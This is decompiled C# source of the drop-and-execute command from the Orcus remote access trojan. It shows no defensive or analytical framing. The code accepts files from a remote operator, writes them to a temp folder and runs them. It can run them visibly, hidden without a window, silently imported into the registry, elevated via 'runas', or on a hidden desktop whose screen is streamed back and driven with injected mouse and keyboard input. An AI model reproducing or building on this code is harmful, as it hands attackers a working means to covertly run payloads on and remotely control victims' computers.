using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using Orcus.Plugins;
using Orcus.Shared.Commands.DropAndExecute;
using Orcus.Shared.Commands.RemoteDesktop;
using Orcus.Shared.Data;
using Orcus.Shared.NetSerializer;
using Orcus.Utilities.WindowsDesktop;

namespace Orcus.Commands.DropAndExecute;

[DisallowMultipleThreads]
public class DropAndExecuteCommand : Command
{
	private List<TransferedFileInfo> _transferedFiles;

	private string _targetDirectory;

	private IApplicationWarder _applicationWarder;

	public override void Dispose()
	{
		((Command)this).Dispose();
		_applicationWarder?.StopExecution();
		_applicationWarder?.Dispose();
		if (_transferedFiles != null)
		{
			foreach (TransferedFileInfo transferedFile in _transferedFiles)
			{
				transferedFile.Dispose();
			}
		}
		if (_targetDirectory != null)
		{
			Directory.Delete(_targetDirectory, recursive: true);
		}
	}

	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Expected I4, but got Unknown
		//IL_01cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e9: Expected I4, but got Unknown
		DropAndExecuteCommunication val = (DropAndExecuteCommunication)parameter[0];
		Guid fileGuid;
		byte[] windowUpdateData;
		switch ((int)val)
		{
		case 0:
		{
			TransferedFileInfo transferedFileInfo = new TransferedFileInfo(Serializer.FastDeserialize<FileTransferInfo>(parameter, 1), GetTargetDirectory());
			if (_transferedFiles == null)
			{
				_transferedFiles = new List<TransferedFileInfo>();
			}
			_transferedFiles.Add(transferedFileInfo);
			break;
		}
		case 1:
		{
			fileGuid = new Guid(parameter.Skip(1).Take(16).ToArray());
			bool? flag = (_transferedFiles?.FirstOrDefault((TransferedFileInfo x) => x.Guid == fileGuid))?.ReceiveData(parameter, 17, parameter.Length - 17);
			if (flag.HasValue)
			{
				if (flag == true)
				{
					((Command)this).ResponseBytes((byte)5, fileGuid.ToByteArray(), connectionInfo);
				}
				else
				{
					((Command)this).ResponseBytes((byte)6, fileGuid.ToByteArray(), connectionInfo);
				}
			}
			break;
		}
		case 2:
		{
			fileGuid = new Guid(parameter.Skip(1).Take(16).ToArray());
			TransferedFileInfo transferedFileInfo = _transferedFiles?.FirstOrDefault((TransferedFileInfo x) => x.Guid == fileGuid);
			if (transferedFileInfo != null)
			{
				transferedFileInfo.Dispose();
				_transferedFiles.Remove(transferedFileInfo);
			}
			break;
		}
		case 3:
		{
			ExecuteOptions options = Serializer.FastDeserialize<ExecuteOptions>(parameter, 1);
			TransferedFileInfo transferedFileInfo = _transferedFiles.FirstOrDefault((TransferedFileInfo x) => x.Guid == options.get_FileGuid());
			if (transferedFileInfo == null)
			{
				((Command)this).ResponseByte((byte)7, connectionInfo);
				break;
			}
			ExecutionMode executionMode = options.get_ExecutionMode();
			switch ((int)executionMode)
			{
			default:
				throw new ArgumentOutOfRangeException();
			case 0:
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo(transferedFileInfo.FileName)
				{
					Arguments = options.get_Arguments()
				};
				if (options.get_RunAsAdministrator())
				{
					processStartInfo.Verb = "runas";
				}
				Process process = Process.Start(processStartInfo);
				Thread.Sleep(1000);
				if (process == null || process.HasExited)
				{
					int value2 = process?.ExitCode ?? 0;
					((Command)this).ResponseBytes((byte)8, BitConverter.GetBytes(value2), connectionInfo);
				}
				else
				{
					((Command)this).ResponseByte((byte)9, connectionInfo);
				}
				break;
			}
			case 1:
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo(transferedFileInfo.FileName)
				{
					Arguments = options.get_Arguments(),
					CreateNoWindow = true,
					UseShellExecute = false,
					WindowStyle = ProcessWindowStyle.Hidden
				};
				if (transferedFileInfo.FileName.EndsWith("reg", StringComparison.OrdinalIgnoreCase))
				{
					processStartInfo.FileName = "regedit.exe";
					processStartInfo.Arguments = $"/s \"{transferedFileInfo.FileName}\"";
				}
				if (options.get_RunAsAdministrator())
				{
					processStartInfo.Verb = "runas";
				}
				Process process = Process.Start(processStartInfo);
				Thread.Sleep(1000);
				if (process == null || process.HasExited)
				{
					int value = process?.ExitCode ?? 0;
					((Command)this).ResponseBytes((byte)8, BitConverter.GetBytes(value), connectionInfo);
				}
				else
				{
					((Command)this).ResponseByte((byte)9, connectionInfo);
				}
				break;
			}
			case 2:
				break;
			case 3:
			{
				_applicationWarder = new HiddenDesktopApplicationManager();
				try
				{
					_applicationWarder.OpenApplication(transferedFileInfo.FileName, options.get_Arguments(), options.get_RunAsAdministrator());
				}
				catch (Exception)
				{
					((Command)this).ResponseByte((byte)10, connectionInfo);
					_applicationWarder.Dispose();
					_applicationWarder = null;
					break;
				}
				IDataInfo firstRenderInfo = null;
				WindowUpdate windowUpdate = null;
				for (int i = 0; i < 5; i++)
				{
					try
					{
						windowUpdate = _applicationWarder.GetWindowUpdate(0L, out firstRenderInfo);
					}
					catch (Exception)
					{
					}
					if (windowUpdate != null)
					{
						break;
					}
					Thread.Sleep(1000);
				}
				windowUpdateData = Serializer.FastSerialize<WindowUpdate>(windowUpdate);
				connectionInfo.UnsafeResponse((Command)(object)this, firstRenderInfo.get_Length() + windowUpdateData.Length + 4 + 1, (Action<BinaryWriter>)delegate(BinaryWriter writer)
				{
					writer.Write((byte)11);
					writer.Write(windowUpdateData.Length);
					writer.Write(windowUpdateData);
					firstRenderInfo.WriteIntoStream(writer.BaseStream);
				});
				break;
			}
			}
			break;
		}
		case 4:
		{
			if (_applicationWarder == null)
			{
				break;
			}
			IDataInfo renderInfo;
			WindowUpdate windowUpdate = _applicationWarder.GetWindowUpdate(BitConverter.ToInt64(parameter, 1), out renderInfo);
			if (windowUpdate == null)
			{
				_applicationWarder.Dispose();
				((Command)this).ResponseByte((byte)19, connectionInfo);
				break;
			}
			windowUpdateData = Serializer.FastSerialize<WindowUpdate>(windowUpdate);
			IDataInfo obj = renderInfo;
			connectionInfo.UnsafeResponse((Command)(object)this, ((obj != null) ? obj.get_Length() : 0) + windowUpdateData.Length + 4 + 1, (Action<BinaryWriter>)delegate(BinaryWriter writer)
			{
				writer.Write((byte)12);
				writer.Write(windowUpdateData.Length);
				writer.Write(windowUpdateData);
				IDataInfo obj2 = renderInfo;
				if (obj2 != null)
				{
					obj2.WriteIntoStream(writer.BaseStream);
				}
			});
			break;
		}
		case 13:
		{
			long windowHandle = BitConverter.ToInt64(parameter, 1);
			OnWindowAction((RemoteDesktopAction)parameter[9], parameter, 10, windowHandle);
			break;
		}
		case 14:
			_applicationWarder.StopExecution();
			_applicationWarder.Dispose();
			_applicationWarder = null;
			break;
		case 15:
			_applicationWarder.Dispose();
			_applicationWarder = null;
			break;
		case 16:
			if (_applicationWarder is HiddenDesktopApplicationManager hiddenDesktopApplicationManager)
			{
				hiddenDesktopApplicationManager.Desktop.Show();
				((Command)this).ResponseByte((byte)17, connectionInfo);
			}
			break;
		default:
			throw new ArgumentOutOfRangeException();
		case 18:
			Desktop.Default.Show();
			((Command)this).ResponseByte((byte)17, connectionInfo);
			break;
		}
	}

	private string GetTargetDirectory()
	{
		if (_targetDirectory == null)
		{
			_targetDirectory = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N"));
			Directory.CreateDirectory(_targetDirectory);
		}
		return _targetDirectory;
	}

	private void OnWindowAction(RemoteDesktopAction remoteDesktopAction, byte[] data, int index, long windowHandle)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Invalid comparison between Unknown and I4
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if ((int)remoteDesktopAction != 0)
		{
			if ((int)remoteDesktopAction != 1)
			{
				throw new ArgumentOutOfRangeException("remoteDesktopAction", remoteDesktopAction, null);
			}
			short scanCode = BitConverter.ToInt16(data, index + 1);
			_applicationWarder.DoKeyboardAction((RemoteDesktopKeyboardAction)data[index], scanCode, windowHandle);
		}
		else
		{
			int x = BitConverter.ToInt32(data, index + 1);
			int y = BitConverter.ToInt32(data, index + 5);
			int extra = BitConverter.ToInt32(data, index + 9);
			_applicationWarder.DoMouseAction((RemoteDesktopMouseAction)data[index], x, y, extra, windowHandle);
		}
	}

	protected override uint GetId()
	{
		return 34u;
	}
}
